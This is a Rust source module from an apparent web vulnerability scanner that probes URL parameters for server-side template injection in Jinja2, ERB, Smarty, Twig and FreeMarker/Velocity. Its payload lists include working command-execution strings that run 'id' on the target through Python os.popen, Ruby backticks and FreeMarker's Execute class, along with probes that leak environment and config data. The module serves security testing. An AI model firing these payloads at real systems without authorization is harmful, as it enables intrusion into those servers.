// SSTI Expert Module - Server-Side Template Injection detection
use crate::Result;
use reqwest::Client;
use serde::{Deserialize, Serialize};
use std::time::Duration;
use super::mutation::*;

#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct SstiVulnerability {
    pub url: String,
    pub parameter: String,
    pub template_engine: String,
    pub payload: String,
    pub severity: String,
    pub confidence: f64,
    pub evidence: Vec<String>,
}

pub struct SstiExpert {
    client: Client,
}

impl SstiExpert {
    pub fn new() -> Self {
        Self {
            client: Client::new(),
        }
    }

    /// Comprehensive SSTI detection
    pub async fn detect_ssti(
        &self,
        url: &str,
        parameters: &[(&str, &str)],
    ) -> Result<Vec<SstiVulnerability>> {
        let mut vulnerabilities = Vec::new();

        for (param_name, _param_value) in parameters {
            // Test Jinja2/Jinja (Python)
            let jinja_vulns = self.test_jinja(url, param_name).await?;
            vulnerabilities.extend(jinja_vulns);

            // Test ERB (Ruby)
            let erb_vulns = self.test_erb(url, param_name).await?;
            vulnerabilities.extend(erb_vulns);

            // Test Smarty (PHP)
            let smarty_vulns = self.test_smarty(url, param_name).await?;
            vulnerabilities.extend(smarty_vulns);

            // Test Twig (PHP)
            let twig_vulns = self.test_twig(url, param_name).await?;
            vulnerabilities.extend(twig_vulns);

            // Test Velocity/FreeMarker (Java)
            let java_vulns = self.test_java_templates(url, param_name).await?;
            vulnerabilities.extend(java_vulns);
        }

        Ok(vulnerabilities)
    }

    /// Jinja2 detection (Python - Flask, Django)
    async fn test_jinja(&self, url: &str, param: &str) -> Result<Vec<SstiVulnerability>> {
        let mut vulns = Vec::new();

        let payloads = vec![
            ("{{7*7}}", "49", "Math expression"),
            ("{{config}}", "config", "Config object"),
            ("{{self}}", "object", "Self object"),
            ("{{__import__('os').popen('id').read()}}", "uid=", "RCE"),
        ];

        for (payload, expected, desc) in payloads {
            let test_url = self.build_url(url, param, payload);

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(Duration::from_secs(10))
                .send()
                .await
            {
                if let Ok(body) = response.text().await {
                    if body.contains(expected) && !body.contains("{{") {
                        vulns.push(SstiVulnerability {
                            url: test_url,
                            parameter: param.to_string(),
                            template_engine: "Jinja2".to_string(),
                            payload: payload.to_string(),
                            severity: if desc == "RCE" {
                                "Critical".to_string()
                            } else {
                                "High".to_string()
                            },
                            confidence: 0.95,
                            evidence: vec![format!("Expression evaluated: {}", desc)],
                        });
                        break;
                    }
                }
            }
        }

        Ok(vulns)
    }

    /// ERB detection (Ruby - Rails)
    async fn test_erb(&self, url: &str, param: &str) -> Result<Vec<SstiVulnerability>> {
        let mut vulns = Vec::new();

        let payloads = vec![
            ("<%= 7*7 %>", "49"),
            ("<%= ENV.keys %>", "SHELL"),
            ("<%= `id` %>", "uid="),
        ];

        for (payload, expected) in payloads {
            let test_url = self.build_url(url, param, payload);

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(Duration::from_secs(10))
                .send()
                .await
            {
                if let Ok(body) = response.text().await {
                    if body.contains(expected) && !body.contains("<%") {
                        vulns.push(SstiVulnerability {
                            url: test_url,
                            parameter: param.to_string(),
                            template_engine: "ERB".to_string(),
                            payload: payload.to_string(),
                            severity: "High".to_string(),
                            confidence: 0.90,
                            evidence: vec!["ERB template executed".to_string()],
                        });
                        break;
                    }
                }
            }
        }

        Ok(vulns)
    }

    /// Smarty detection (PHP)
    async fn test_smarty(&self, url: &str, param: &str) -> Result<Vec<SstiVulnerability>> {
        let mut vulns = Vec::new();

        let payloads = vec![
            ("{$smarty.version}", "3."),
            ("{php}echo 123;{/php}", "123"),
            ("{$GLOBALS['_GET']['x']}", "GET"),
        ];

        for (payload, expected) in payloads {
            let test_url = self.build_url(url, param, payload);

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(Duration::from_secs(10))
                .send()
                .await
            {
                if let Ok(body) = response.text().await {
                    if body.contains(expected) && !body.contains("{$") {
                        vulns.push(SstiVulnerability {
                            url: test_url,
                            parameter: param.to_string(),
                            template_engine: "Smarty".to_string(),
                            payload: payload.to_string(),
                            severity: "High".to_string(),
                            confidence: 0.90,
                            evidence: vec!["Smarty template executed".to_string()],
                        });
                        break;
                    }
                }
            }
        }

        Ok(vulns)
    }

    /// Twig detection (PHP - Symfony)
    async fn test_twig(&self, url: &str, param: &str) -> Result<Vec<SstiVulnerability>> {
        let mut vulns = Vec::new();

        let payloads = vec![
            ("{{7*7}}", "49"),
            ("{{_self}}", "object"),
            ("{{app.request}}", "Request"),
        ];

        for (payload, expected) in payloads {
            let test_url = self.build_url(url, param, payload);

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(Duration::from_secs(10))
                .send()
                .await
            {
                if let Ok(body) = response.text().await {
                    if body.contains(expected) && !body.contains("{{") {
                        vulns.push(SstiVulnerability {
                            url: test_url,
                            parameter: param.to_string(),
                            template_engine: "Twig".to_string(),
                            payload: payload.to_string(),
                            severity: "High".to_string(),
                            confidence: 0.90,
                            evidence: vec!["Twig template executed".to_string()],
                        });
                        break;
                    }
                }
            }
        }

        Ok(vulns)
    }

    /// Java template engines (FreeMarker, Velocity)
    async fn test_java_templates(&self, url: &str, param: &str) -> Result<Vec<SstiVulnerability>> {
        let mut vulns = Vec::new();

        let payloads = vec![
            // FreeMarker
            ("<#assign ex=\"freemarker.template.utility.Execute\"?new()> ${ ex(\"id\") }", "uid="),
            // Velocity
            ("#set($x=7*7)$x", "49"),
        ];

        for (payload, expected) in payloads {
            let test_url = self.build_url(url, param, payload);

            if let Ok(response) = self
                .client
                .get(&test_url)
                .timeout(Duration::from_secs(10))
                .send()
                .await
            {
                if let Ok(body) = response.text().await {
                    if body.contains(expected) {
                        vulns.push(SstiVulnerability {
                            url: test_url,
                            parameter: param.to_string(),
                            template_engine: "Java Template".to_string(),
                            payload: payload.to_string(),
                            severity: "Critical".to_string(),
                            confidence: 0.95,
                            evidence: vec!["Java template injection - potential RCE".to_string()],
                        });
                        break;
                    }
                }
            }
        }

        Ok(vulns)
    }

    fn build_url(&self, base: &str, param: &str, value: &str) -> String {
        if base.contains('?') {
            format!("{}&{}={}", base, param, urlencoding::encode(value).to_string())
        } else {
            format!("{}?{}={}", base, param, urlencoding::encode(value).to_string())
        }
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_url_building() {
        let expert = SstiExpert::new();
        let url = expert.build_url("http://example.com", "name", "{{7*7}}");
        assert!(url.contains("name="));
        // URL encoding converts * to %2A and { to %7B
        assert!(url.contains("%7B") || url.contains("7*7"));
    }

    #[test]
    fn test_url_building_with_existing_params() {
        let expert = SstiExpert::new();
        let url = expert.build_url("http://example.com?id=1", "name", "test");
        assert!(url.contains("id=1"));
        assert!(url.contains("name="));
    }
}
